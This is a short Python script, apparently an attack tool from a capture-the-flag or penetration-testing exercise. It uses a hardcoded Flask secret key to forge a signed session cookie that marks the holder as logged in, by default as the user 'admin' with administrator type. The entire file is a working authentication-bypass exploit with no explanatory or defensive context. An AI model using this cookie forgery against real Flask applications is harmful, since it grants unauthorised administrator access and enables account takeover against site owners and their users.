import sys, base64, json
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

SECRET = "GVhVLraKTxXEHHWArrLp"
USERNAME = sys.argv[1] if len(sys.argv) > 1 else "admin"
USERTYPE = sys.argv[2] if len(sys.argv) > 2 else "administrator"

app = Flask(__name__)
app.config["SECRET_KEY"] = SECRET
sci = SecureCookieSessionInterface()
ser = sci.get_signing_serializer(app)
data = {"logged_in": True, "username": USERNAME, "usertype": USERTYPE}
cookie = ser.dumps(data)
print(cookie)
